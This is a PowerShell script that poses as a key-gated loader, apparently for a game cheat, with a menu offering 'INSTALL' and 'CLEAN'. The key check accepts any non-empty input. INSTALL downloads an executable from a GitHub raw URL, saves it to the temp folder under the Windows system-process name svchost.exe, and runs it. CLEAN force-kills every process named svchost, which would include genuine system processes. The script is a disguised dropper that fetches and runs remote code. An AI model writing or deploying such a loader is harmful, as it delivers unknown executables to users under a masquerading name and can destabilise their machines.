$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "JETT.EXE ON TOP"

# =========================
# HEADER
# =========================

function Show-Header {

    Clear-Host


    Write-Host ""
    Write-Host "              SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " -ForegroundColor White
    Write-Host "                 TEST POWERSHELL " -ForegroundColor DarkGray

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""

}



function Write-Console {

    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "NO KEY" {
            Write-Host "  [-] " -NoNewline -ForegroundColor Red
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}



Show-Header

Write-Host ""
Write-Host "              E N T E R  K E Y" -ForegroundColor White
Write-Host ""

Write-Host "  [>] " -NoNewline -ForegroundColor Magenta

$key = $Host.UI.ReadLine()



if ([string]::IsNullOrWhiteSpace($key))
{
    Write-Host ""

    Write-Console "NO KEY" "NO KEY"

    Start-Sleep 2
    exit
}

Write-Host ""

Write-Console "SUCCESS" "SUCCESS"

Start-Sleep 1



while ($true)
{
    Show-Header

    Write-Console "1. INSTALL" "INFO"
    Write-Console "2. CLEAN" "INFO"
    Write-Console "0. EXIT" "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()



    if ($choice -eq "1")
    {
        Clear-Host
        Show-Header

        Write-Console "DOWNLOADING..." "INFO"

        $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
        $path = "$env:TEMP\svchost.exe"

        try {

            Invoke-WebRequest `
            -Uri $url `
            -OutFile $path `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"

            if (Test-Path $path)
            {
                Write-Host ""

                Write-Console "INSTALL SUCCESS" "SUCCESS"

                Start-Sleep 1

                Start-Process $path
            }
            else
            {
                Write-Host ""

                Write-Console "INSTALL FAILED" "NO KEY"
            }
        }
        catch {

            Write-Host ""

            Write-Console "INSTALL FAILED" "NO KEY"
        }

        Write-Host ""
        Pause
    }



    elseif ($choice -eq "2")
    {
        Clear-Host
        Show-Header

        Write-Console "CLEANING..." "INFO"

        Stop-Process `
        -Name "svchost" `
        -Force `
        -ErrorAction SilentlyContinue

        Remove-Item `
        "$env:TEMP\svchost.exe" `
        -Force `
        -ErrorAction SilentlyContinue

        Write-Host ""

        Write-Console "CLEAN SUCCESS" "SUCCESS"

        Write-Host ""
        Pause
    }



    elseif ($choice -eq "0")
    {
        exit
    }
}
